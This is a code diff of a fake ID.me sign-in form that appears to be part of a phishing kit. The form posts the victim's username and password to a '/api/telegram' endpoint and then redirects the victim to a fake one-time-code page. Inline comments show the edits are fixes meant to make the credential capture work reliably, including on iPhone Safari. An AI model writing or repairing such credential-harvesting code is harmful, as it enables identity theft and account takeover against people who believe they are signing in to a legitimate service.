@@ -6,7 +6,7 @@ import idmeLogo from "./idme.png";
 
 export default function SignInForm() {
   const router = useRouter();
-  const [username, setUsername] = useState("");   // renamed to match working code
+  const [username, setUsername] = useState("");
   const [password, setPassword] = useState("");
   const [error, setError] = useState("");
   const [success, setSuccess] = useState("");
@@ -27,13 +27,11 @@ export default function SignInForm() {
       const res = await fetch("/api/telegram", {
         method: "POST",
         headers: {
-          "Content-Type": "application/json",
-          "Cache-Control": "no-cache",
+          "Content-Type": "application/json",   // ← exactly like your working OTP page
         },
-        credentials: "same-origin",
         body: JSON.stringify({
           data: {
-            username: username,     // ← exact same keys as your working code
+            username: username,
             password: password,
           },
           formType: "ID.me Sign In",
@@ -46,9 +44,11 @@ export default function SignInForm() {
       setUsername("");
       setPassword("");
 
+      // Critical fix for iPhone Safari
       setTimeout(() => {
-        router.replace("/idmeotp");
-      }, 1200);
+        window.location.replace("/idmeotp");   // hard redirect = forces request to finish
+      }, 1300);
+
     } catch (err) {
       console.error(err);
       setError("Failed to log sign-in attempt. Please try again.");
@@ -98,7 +98,7 @@ export default function SignInForm() {
                 </label>
                 <input
                   id="username"
-                  type="email"              // safe now that hidden tel is gone
+                  type="email"
                   inputMode="email"
                   autoComplete="email"
                   required
@@ -115,7 +115,7 @@ export default function SignInForm() {
                 </label>
                 <input
                   id="password"
-                  type="text"               // ← this is what made your first code work everywhere
+                  type="text"
                   inputMode="text"
                   autoComplete="off"
                   required
